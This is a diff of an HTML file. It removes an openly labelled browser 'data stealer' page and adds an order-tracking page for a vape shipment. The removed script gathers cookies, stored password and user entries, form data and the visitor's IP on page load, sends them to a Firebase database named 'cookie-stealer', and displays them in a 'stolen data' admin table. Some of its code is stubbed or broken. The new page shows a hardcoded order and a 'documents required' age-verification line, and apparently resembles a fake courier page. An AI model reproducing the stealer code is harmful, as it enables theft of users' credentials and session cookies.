@@ -1,326 +1,693 @@
-
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Auto Data Stealer</title>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Order Tracking</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+  
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400;500;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
+      font-family: 'Open Sans', sans-serif;
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    
+    .custom_navbar {
+      background: #fff;
+      padding-top: 10px;
+      padding-bottom: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    
+    .custom_navbar .navbar-brand {
+      width: 200px;
+    }
+    
+    .custom_navbar .navbar-brand img {
+      max-width: 100%;
+      height: 60px;
+    }
+    
+    .status-delivery-heading {
+      background-color: #2c3e50;
+      color: white;
+      padding: 12px 15px;
+      font-weight: 600;
+      border-radius: 5px 5px 0 0;
+    }
+    
+    .status-delivery-box {
+      background: #fff;
       padding: 20px;
+      border-radius: 0 0 5px 5px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      margin-bottom: 20px;
     }
-    h1 {
-      color: #0f0;
+    
+    .ready_to_go {
+      color: #2ecc71;
+      font-weight: 700;
+      font-size: 1.2rem;
     }
-    .stealer {
-      display: none;
+    
+    .track_details li {
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+      display: flex;
+      justify-content: space-between;
     }
-    .admin {
-      display: block;
+    
+    .track_details li span {
+      font-weight: 600;
+      color: #2c3e50;
     }
-    table {
+    
+    .track {
+      display: flex;
       width: 100%;
-      border-collapse: collapse;
+      margin-bottom: 30px;
+      position: relative;
+    }
+    
+    .track .step {
+      flex: 1;
+      text-align: center;
+      position: relative;
+      padding-top: 45px;
+    }
+    
+    .track .step:before {
+      content: '';
+      position: absolute;
+      height: 4px;
+      background-color: #ddd;
+      top: 25px;
+      left: 50%;
+      right: 0;
+      z-index: 1;
+    }
+    
+    .track .step:first-child:before {
+      left: 50%;
+    }
+    
+    .track .step:last-child:before {
+      right: 50%;
+    }
+    
+    .track .step.active:before,
+    .track .step.current:before {
+      background-color: #2ecc71;
+    }
+    
+    .track .step .icon {
+      width: 50px;
+      height: 50px;
+      line-height: 50px;
+      border-radius: 50%;
+      background: #ddd;
+      margin: 0 auto;
+      display: block;
+      position: relative;
+      z-index: 2;
+    }
+    
+    .track .step.active .icon,
+    .track .step.current .icon {
+      background: #2ecc71;
+      color: white;
+    }
+    
+    .track .step.current .icon {
+      background: #3498db;
+    }
+    
+    .track .step .text {
+      margin-top: 10px;
+      font-weight: 500;
+    }
+    
+    .shipment_progress {
+      margin-top: 30px;
+    }
+    
+    .step-progress {
+      list-style: none;
+      padding: 0;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    
+    .step-progress-item {
+      padding: 15px 0;
+      border-left: 3px solid #ddd;
+      position: relative;
+      padding-left: 25px;
+      margin-left: 15px;
+    }
+    
+    .step-progress-item.is-done {
+      border-left-color: #2ecc71;
+    }
+    
+    .step-progress-item:before {
+      content: '';
+      width: 15px;
+      height: 15px;
+      background: #ddd;
+      border-radius: 50%;
+      position: absolute;
+      left: -9px;
+      top: 20px;
+    }
+    
+    .step-progress-item.is-done:before {
+      background: #2ecc71;
+    }
+    
+    .progress_content p {
+      margin-bottom: 5px;
+    }
+    
+    .progress_content p:first-child {
+      font-weight: 600;
+      color: #2c3e50;
+    }
+    
+    .footer_box {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 0;
+      border-top: 1px solid #eee;
+    }
+    
+    .footer_logo img {
+      height: 40px;
+    }
+    
+    .product-image-container {
+      text-align: center;
+      padding: 15px;
+      border: 1px solid #eee;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+    
+    .product-image-container img {
+      max-width: 100%;
+      height: auto;
+      max-height: 200px;
+    }
+    
+    .customer-details {
       margin-top: 20px;
+      padding-top: 15px;
+      border-top: 1px solid #eee;
     }
-    th, td {
-      border: 1px solid #555;
-      padding: 10px;
-      text-align: left;
+    
+    .customer-details h5 {
+      color: #2c3e50;
+      margin-bottom: 15px;
     }
-    th {
-      background-color: #222;
+    
+    .customer-details .detail-item {
+      display: flex;
+      margin-bottom: 8px;
+    }
+    
+    .customer-details .detail-label {
+      font-weight: 600;
+      min-width: 120px;
+      color: #2c3e50;
+    }
+    
+    .admin-panel {
+      background: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      margin-bottom: 30px;
+    }
+    
+    .admin-panel h3 {
+      color: #2c3e50;
+      margin-bottom: 20px;
+    }
+    
+    .form-group {
+      margin-bottom: 15px;
+    }
+    
+    .form-group label {
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    
+    .btn-primary {
+      background-color: #3498db;
+      border-color: #3498db;
+    }
+    
+    .btn-success {
+      background-color: #2ecc71;
+      border-color: #2ecc71;
+    }
+    
+    .btn-warning {
+      background-color: #f39c12;
+      border-color: #f39c12;
+    }
+    
+    /* Responsive styles */
+    @media(max-width: 991px) {
+      .custom_navbar .navbar-toggler {
+        display: block;
+        border-color: #000;
+      }
+      
+      .custom_navbar .navbar-toggler span {
+        background-image: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(0, 0, 0, 1)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
+      }
+      
+      .custom_navbar .collapse:not(.show) {
+        display: none!important;
+      }
+      
+      .custom_navbar .navbar-collapse {
+        width: 100%;
+        flex-basis: 100%;
+      }
+    }
+    
+    @media(max-width: 767px) {
+      .footer_box {
+        flex-wrap: wrap;
+      }
+      
+      .footer_box .footer_left {
+        width: 100%;
+        margin-bottom: 15px;
+        text-align: center;
+      }
+      
+      .footer_box .footer_logo {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+    
+    @media(max-width: 575px) {
+      .body-wrapper {
+        display: flex;
+        flex-wrap: wrap;
+      }
+      
+      header {
+        order: 0;
+        width: 100%;
+      }
+      
+      .status-delivery {
+        order: 1;
+        width: 100%;
+      }
+      
+      footer {
+        order: 2;
+        width: 100%;
+      }
+      
+      .track {
+        height: auto;
+        flex-wrap: wrap;
+        margin-bottom: 0;
+      }
+      
+      .track .step {
+        width: 100%;
+        text-align: left;
+        margin-top: 0;
+        margin-bottom: 30px;
+        display: flex;
+        align-items: center;
+      }
+      
+      .track .step .icon {
+        text-align: center;
+        margin-right: 10px;
+      }
+      
+      .track .step .text {
+        margin-top: 0;
+      }
+      
+      .track .step:before {
+        left: -13px!important;
+        width: 55px;
+        top: 42px;
+        transform: rotate(90deg);
+      }
+      
+      .shipment_progress {
+        padding-top: 0;
+        margin-top: 0!important;
+      }
     }
   </style>
 </head>
+
 <body>
+  <div class="body-wrapper">
+    <!-- ======= Header ======= -->
+    <header class="mb-3">
+      <div class="container">
+        <nav class="navbar navbar-expand-md custom_navbar">
+          <a class="navbar-brand" href="#">
+            <img src="https://img.freepik.com/premium-vector/shipping-courier-delivery-service-company-logo_989520-354.jpg?semt=ais_incoming&w=740&q=80"
+          </a>
+          
+       
+        </nav>
+      </div>
+    </header><!-- End Header -->
 
-<!-- Stealer Section -->
-<div class="stealer">
-  <h1>Browser Data Stealer</h1>
-  <p>Stealing your data... 🚀</p>
-</div>
+    <!-- Order Tracking Section -->
+    <div class="status-delivery mb-3">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12 col-lg-4 d-flex m-b-20 mb-lg-0">
+            <div style="background: #fff; width: 100%;">
+              <div class="status-delivery-heading">Order Details</div>
+              <div class="status-delivery-box">
+                <div class="product-image-container">
+                  <img id="productImage" src="https://i.ibb.co/xqgcsBNZ/mP35d-02.webp" alt="Product Image">
+                </div>
+                <div class="ready_to_go" id="orderStatusDisplay">Booked</div>
+                <div class="track_con mt-2"></div>
+                
+                <ul class="track_details">
+                  <li><span>ORDER Name:</span> <span id="orderName">Lost-Vape | Galaxy S360</span></li>
+                  <li><span>ORDER PLACED ON:</span> <span id="orderDate">Nov 05, 2025 02:03</span></li>
+                  <li><span>ORDER DELIVERY:</span> <span id="deliveryMethod">Via Flight</span></li>
+                  <li><span>TRACKING ID:</span> <span id="trackingId">236454782920</span></li>
+                   <li><span>DELIVERY EXPECTED:</span> <span id="orderName"> 26th December</span></li>
+                  <li><span>ORDER ID:</span> <span id="orderId">#55445</span></li>
+                   <li><span>AGE VERIFICATION:</span> <span id="orderName">In Process (Documents Required)</span></li>
+                </ul>
+                
+                <!-- Customer Details Section -->
+                <div class="customer-details">
+                  <h5>Customer Details</h5>
+                  <div class="detail-item">
+                    <span class="detail-label">Name:</span>
+                    <span id="customerName">John Doe</span>
+                  </div>
+                  <div class="detail-item">
+                    <span class="detail-label">Email:</span>
+                    <span id="customerEmail">johndoe@example.com</span>
+                  </div>
+                  <div class="detail-item">
+                    <span class="detail-label">Phone:</span>
+                    <span id="customerPhone">+1 234 567 8900</span>
+                  </div>
+                  <div class="detail-item">
+                    <span class="detail-label">Payment Method:</span>
+                    <span id="paymentMethod">Credit Card</span>
+                  </div>
+                  <div class="detail-item">
+                    <span class="detail-label">Ordered From:</span>
+                    <span id="orderedFrom">Online Store</span>
+                  </div>
+                  <div class="detail-item">
+                    <span class="detail-label">Shipping Address:</span>
+                    <span id="shippingAddress">123 Main Street, Apt 4B, New York, NY 10001, USA</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="col-md-12 col-lg-8">
+            <div class="status-delivery-heading">Status Delivery</div>
+            <div class="status-delivery-box">
+              <h3 id="deliveryStatusDisplay">Booked</h3> 
+              
+              <div class="track" id="trackingSteps">
+                <!-- Tracking steps will be dynamically generated -->
+              </div>
+              
+              <div class="shipment_progress mt-4"><h4>Shipment Progress</h4></div>
+              <ul class="step-progress scrollbar" id="shipmentProgress">
+                <!-- Shipment progress will be dynamically generated -->
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-<!-- Admin Panel Section -->
-<div class="admin">
-  <h1>Admin Panel - Stolen Data</h1>
-  <table>
-    <thead>
-      <tr>
-        <th>Timestamp</th>
-        <th>IP Address</th>
-        <th>User Agent</th>
-        <th>Browser Info</th>
-        <th>Passwords</th>
-        <th>Browsing History</th>
-        <th>Cookies</th>
-        <th>Form Data</th>
-        <th>Credentials</th>
-      </tr>
-    </thead>
-    <tbody id="data-table-body">
-      <!-- Data will be displayed here -->
-    </tbody>
-  </table>
-</div>
+    <footer class="m-b-10">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12 col-sm-12 col-xs-12">
+            <div class="footer_box">
+              <div class="footer_left">
+                <span class="m-r-10">© 2025 Order Copyright</span>
+              </div>
+              <div class="footer_logo d-flex align-items-center">
+                <p class="m-r-10 mb-0">Powered by: </p>
+                <h2>IndoCourier</h2>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
 
-<!-- Firebase SDK -->
-<script type="text/javascript">
-  // Import Firebase SDK
-  var firebase = {};
-  firebase.initializeApp = function(config) {
-    return {
-      database: function() {
-        return {
-          ref: function(path) {
-            return {
-              push: function(data) {
-                return {
-                  set: function(value) {
-                    return Promise.resolve();
-                  }
-                };
-              }
-            };
-          }
-        };
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+  
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDTSLLiDogSy0sRhokTcGqirqEj3j1ishU",
+      authDomain: "ordertrack-69bb1.firebaseapp.com",
+      databaseURL: "https://ordertrack-69bb1-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "ordertrack-69bb1",
+      storageBucket: "ordertrack-69bb1.firebasestorage.app",
+      messagingSenderId: "971543158468",
+      appId: "1:971543158468:web:2fd10117abaacb083c7391"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // PERMANENT product image URL - cannot be changed
+    const PERMANENT_PRODUCT_IMAGE = "https://i.ibb.co/xqgcsBNZ/mP35d-02.webp";
+
+    // Default order data with fresh status (no green marks)
+    const defaultOrderData = {
+      orderStatus: "Booked",
+      productImage: PERMANENT_PRODUCT_IMAGE,
+      orderName: "Lost-Vape | Galaxy S360",
+      orderDate: "Nov 05, 2025 02:03",
+      deliveryMethod: "Via Flight",
+      trackingId: "236454782920",
+      orderId: "#55445",
+      // Fresh tracking steps with no green marks (only first step is active)
+      trackingSteps: [
+        { status: "Booked", active: true, current: true },
+        { status: "Pending Pickup", active: false, current: false },
+        { status: "Picked", active: false, current: false },
+        { status: "In Transit", active: false, current: false },
+        { status: "Rad", active: false, current: false },
+        { status: "Out For Delivery", active: false, current: false },
+        { status: "Delivered", active: false, current: false }
+      ],
+      // Empty shipment progress (fresh start)
+      shipmentProgress: [],
+      // Customer details
+      customerDetails: {
+        name: "John Doe",
+        email: "johndoe@example.com",
+        phone: "+1 234 567 8900",
+        paymentMethod: "Credit Card",
+        orderedFrom: "Online Store",
+        shippingAddress: "123 Main Street, Apt 4B, New York, NY 10001, USA"
       }
     };
-  };
 
-  // Firebase Configuration
-  var firebaseConfig = {
-    apiKey: "AIzaSyD0WZgJq6XqEYj8p9GBm5NWhpD6-rpqqDM",
-    authDomain: "cookie-stealer-35c2f.firebaseapp.com",
-    databaseURL: "https://cookie-stealer-35c2f-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "cookie-stealer-35c2f",
-    storageBucket: "cookie-stealer-35c2f.firebasestorage.app",
-    messagingSenderId: "316298229177",
-    appId: "1:316298229177:web:ca61b2f5fe2b6515b1f268"
-  };
+    // DOM elements
+    const orderStatusDisplay = document.getElementById('orderStatusDisplay');
+    const deliveryStatusDisplay = document.getElementById('deliveryStatusDisplay');
+    const trackingSteps = document.getElementById('trackingSteps');
+    const shipmentProgress = document.getElementById('shipmentProgress');
+    const productImage = document.getElementById('productImage');
+    const orderName = document.getElementById('orderName');
+    const orderDate = document.getElementById('orderDate');
+    const deliveryMethod = document.getElementById('deliveryMethod');
+    const trackingId = document.getElementById('trackingId');
+    const orderId = document.getElementById('orderId');
+    
+    // Customer details elements
+    const customerName = document.getElementById('customerName');
+    const customerEmail = document.getElementById('customerEmail');
+    const customerPhone = document.getElementById('customerPhone');
+    const paymentMethod = document.getElementById('paymentMethod');
+    const orderedFrom = document.getElementById('orderedFrom');
+    const shippingAddress = document.getElementById('shippingAddress');
 
-  var app = firebase.initializeApp(firebaseConfig);
-  var db = app.database();
-
-  // Function to get all saved passwords
-  function getSavedPasswords() {
-    var passwords = [];
-    var passwordStores = [
-      window.localStorage,
-      window.sessionStorage,
-      document.body
-    ];
-
-    for (var store of passwordStores) {
-      for (var i = 0; i < store.length; i++) {
-        var key = store.key(i);
-        var value = store.getItem(key);
-        if (key.includes("password") || value.includes("password")) {
-          passwords.push({ key, value });
+    // Load order data from Firebase or use default
+    function loadOrderData() {
+      const orderRef = database.ref('order');
+      orderRef.on('value', (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          console.log("Data loaded from Firebase:", data);
+          updateUI(data);
+        } else {
+          console.log("No data in Firebase, using default");
+          // If no data in Firebase, use default and save it
+          updateUI(defaultOrderData);
+          saveOrderData(defaultOrderData);
         }
-      }
-    }
-
-    return passwords;
-  }
-
-  // Function to get browsing history
-  function getBrowsingHistory() {
-    var history = [];
-    var historyItems = [
-      window.localStorage,
-      window.sessionStorage,
-      document.body
-    ];
-
-    for (var store of historyItems) {
-      for (var i = 0; i < store.length; i++) {
-        var key = store.key(i);
-        var value = store.getItem(key);
-        if (key.includes("history") || value.includes("history")) {
-          history.push({ key, value });
-        }
-      }
-    }
-
-    return history;
-  }
-
-  // Function to get all cookies
-  function getCookies() {
-    var cookies = document.cookie.split(";").map(function(cookie) {
-      var [name, value] = cookie.trim().split("=");
-      return { name, value };
-    });
-    return cookies;
-  }
-
-  // Function to get all form data
-  function getFormData() {
-    var formData = [];
-    var forms = document.querySelectorAll("form");
-
-    for (var form of forms) {
-      var data = new FormData(form);
-      for (var [key, value] of data.entries()) {
-        formData.push({ key, value });
-      }
-    }
-
-    return formData;
-  }
-
-  // Function to get all saved credentials
-  function getSavedCredentials() {
-    var credentials = [];
-    var credentialStores = [
-      window.localStorage,
-      window.sessionStorage
-    ];
-
-    for (var store of credentialStores) {
-      for (var i = 0; i < store.length; i++) {
-        var key = store.key(i);
-        var value = store.getItem(key);
-        if (key.includes("user") || key.includes("pass") || value.includes("user") || value.includes("pass")) {
-          credentials.push({ key, value });
-        }
-      }
-    }
-
-    return credentials;
-  }
-
-  // Function to get browser info
-  function getBrowserInfo() {
-    return {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      screen: {
-        width: window.screen.width,
-        height: window.screen.height,
-        colorDepth: window.screen.colorDepth,
-        pixelDepth: window.screen.pixelDepth
-      }
-    };
-  }
-
-  // Function to get user IP address
-  function getUserIP() {
-    return fetch("https://api.ipify.org?format=json")
-      .then(function(response) {
-        return response.json();
-      })
-      .then(function(data) {
-        return data.ip;
+      }, (error) => {
+        console.error("Error loading data:", error);
+        // Fallback to default data if there's an error
+        updateUI(defaultOrderData);
       });
-  }
-
-  // Function to get current time
-  function getCurrentTime() {
-    return new Date().toISOString();
-  }
-
-  // Function to get all browser data
-  function getBrowserData() {
-    return {
-      time: getCurrentTime(),
-      ip: getUserIP(),
-      browserInfo: getBrowserInfo(),
-      passwords: getSavedPasswords(),
-      browsingHistory: getBrowsingHistory(),
-      cookies: getCookies(),
-      formData: getFormData(),
-      credentials: getSavedCredentials()
-    };
-  }
-
-  // Function to encrypt data
-  function encryptData(data) {
-    return btoa(JSON.stringify(data));
-  }
-
-  // Function to compress data
-  function compressData(data) {
-    return btoa(data);
-  }
-
-  // Function to send data to Firebase
-  function sendDataToFirebase(data) {
-    var encryptedData = encryptData(data);
-    var compressedData = compressData(encryptedData);
-
-    var dataRef = db.ref("stolen_data").push();
-    dataRef.set(compressedData).then(function() {
-      console.log("Data sent to Firebase:", data);
-    }).catch(function(error) {
-      console.error("Error sending data:", error);
-    });
-  }
-
-  // Function to fetch and display data
-  function fetchAllData() {
-    var dataRef = db.ref("Someones_Data_Got_Stolen_ Meowwwww!");
-    dataRef.on("child_added", function(snapshot) {
-      var data = snapshot.val();
-      displayData(data);
-    });
-  }
-
-  // Display data in the table
-  function displayData(data) {
-    var tableBody = document.getElementById("data-table-body");
-    tableBody.innerHTML = "";
-
-    for (var [timestamp, entry] of Object.entries(data)) {
-      var row = document.createElement("tr");
-
-      var timestampCell = document.createElement("td");
-      timestampCell.textContent = `Timestamp: ${timestamp}`;
-      row.appendChild(timestampCell);
-
-      var ipCell = document.createElement("td");
-      ipCell.textContent = `IP: ${entry.ip}`;
-      row.appendChild(ipCell);
-
-      var browserCell = document.createElement("td");
-      browserCell.textContent = "Browser Info: " + JSON.stringify(entry.browserInfo);
-      row.appendChild(browserCell);
-
-      var passwordsCell = document.createElement("td");
-      passwordsCell.textContent = "Passwords: " + JSON.stringify(entry.passwords);
-      row.appendChild(passwordsCell);
-
-      var historyCell = document.createElement("td");
-      historyCell.textContent = "History: " + JSON.stringify(entry.browsingHistory);
-      row.appendChild(historyCell);
-
-      var cookiesCell = document.createElement("td");
-      cookiesCell.textContent = "Cookies: " + JSON.stringify(entry.cookies);
-      row.appendChild(cookiesCell);
-
-      var formDataCell = document.createElement("td");
-      formDataCell.textContent = "Form Data: " + JSON.stringify(entry.formData);
-      row.appendChild(formDataCell);
-
-      var credentialsCell = document.createElement("td");
-      credentialsCell.textContent = "Credentials: " + JSON.stringify(entry.credentials);
-      row.appendChild(credentialsCell);
-
-      tableBody.appendChild(row);
     }
-  }
 
-  // Run the stealer on page load
-  window.onload = function() {
-    var browserData = getBrowserData();
-    sendDataToFirebase(browserData);
-    fetchAllData();
-  };
-</script>
-<script>alert("Your Data Has Been Stolen ! MEOW ");</script>
+    // Save order data to Firebase
+    function saveOrderData(data) {
+      console.log("Saving data to Firebase:", data);
+      // Always ensure the permanent product image is saved
+      const dataToSave = {
+        ...data,
+        productImage: PERMANENT_PRODUCT_IMAGE
+      };
+      database.ref('order').set(dataToSave)
+        .then(() => {
+          console.log("Data saved successfully");
+        })
+        .catch((error) => {
+          console.error("Error saving data:", error);
+        });
+    }
+
+    // Update UI with order data
+    function updateUI(data) {
+      console.log("Updating UI with data:", data);
+      
+      orderStatusDisplay.textContent = data.orderStatus || "Booked";
+      deliveryStatusDisplay.textContent = data.orderStatus || "Booked";
+      
+      // ALWAYS use the permanent product image, ignore any other value
+      productImage.src = PERMANENT_PRODUCT_IMAGE;
+      
+      orderName.textContent = data.orderName || defaultOrderData.orderName;
+      orderDate.textContent = data.orderDate || defaultOrderData.orderDate;
+      deliveryMethod.textContent = data.deliveryMethod || defaultOrderData.deliveryMethod;
+      trackingId.textContent = data.trackingId || defaultOrderData.trackingId;
+      orderId.textContent = data.orderId || defaultOrderData.orderId;
+      
+      // Update customer details
+      const customerData = data.customerDetails || defaultOrderData.customerDetails;
+      customerName.textContent = customerData.name;
+      customerEmail.textContent = customerData.email;
+      customerPhone.textContent = customerData.phone;
+      paymentMethod.textContent = customerData.paymentMethod;
+      orderedFrom.textContent = customerData.orderedFrom;
+      shippingAddress.textContent = customerData.shippingAddress;
+      
+      // Update tracking steps
+      updateTrackingSteps(data.trackingSteps || defaultOrderData.trackingSteps);
+      
+      // Update shipment progress
+      updateShipmentProgress(data.shipmentProgress || []);
+    }
+
+    // Update tracking steps
+    function updateTrackingSteps(steps) {
+      trackingSteps.innerHTML = '';
+      steps.forEach(step => {
+        const stepElement = document.createElement('div');
+        stepElement.className = `step ${step.active ? 'active' : ''} ${step.current ? 'current' : ''}`;
+        
+        const icon = document.createElement('span');
+        icon.className = 'icon';
+        if (step.active) {
+          icon.innerHTML = step.current ? '<i class="fa fa-truck"></i>' : '<i class="fa fa-check"></i>';
+        } else {
+          icon.innerHTML = '<i class="fa fa-clock"></i>';
+        }
+        
+        const text = document.createElement('span');
+        text.className = 'text';
+        text.textContent = step.status;
+        
+        stepElement.appendChild(icon);
+        stepElement.appendChild(text);
+        trackingSteps.appendChild(stepElement);
+      });
+    }
+
+    // Update shipment progress
+    function updateShipmentProgress(progressData) {
+      shipmentProgress.innerHTML = '';
+      
+      if (progressData.length === 0) {
+        const emptyMessage = document.createElement('li');
+        emptyMessage.className = 'step-progress-item';
+        emptyMessage.innerHTML = '<div class="progress_content"><p>No shipment updates yet. Check back later for tracking information.</p></div>';
+        shipmentProgress.appendChild(emptyMessage);
+      } else {
+        progressData.forEach(item => {
+          const li = document.createElement('li');
+          li.className = 'step-progress-item is-done';
+          
+          const content = document.createElement('div');
+          content.className = 'progress_content';
+          
+          const date = document.createElement('p');
+          date.textContent = item.date;
+          
+          const status = document.createElement('p');
+          status.innerHTML = `<strong>${item.status || ''}</strong>`;
+          
+          const location = document.createElement('p');
+          location.innerHTML = `${item.location} <small>(${item.details})</small>`;
+          
+          content.appendChild(date);
+          content.appendChild(status);
+          content.appendChild(location);
+          li.appendChild(content);
+          shipmentProgress.appendChild(li);
+        });
+      }
+    }
+
+    // Initialize the app
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log("Initializing order tracking system...");
+      loadOrderData();
+    });
+  </script>
 </body>
 </html>
